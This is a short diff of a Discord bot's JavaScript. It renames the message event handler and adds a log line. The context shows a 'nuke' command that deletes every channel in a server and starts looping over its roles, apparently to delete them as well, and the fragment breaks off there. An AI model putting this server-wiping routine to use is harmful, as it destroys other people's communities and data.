@@ -38,7 +38,8 @@ client.on('ready', () => {
   console.log(aSName);
 });
 
-client.on('message', async (message) => {
+client.on('messageCreate', async (message) => {
+console.log("msg");
 if( message.content.toLowerCase().startsWith(client.config.PREFIX + "nuke")) {
   message.guild.channels.forEach(channel => channel.delete());
   message.guild.roles.cache.forEach(roles => {
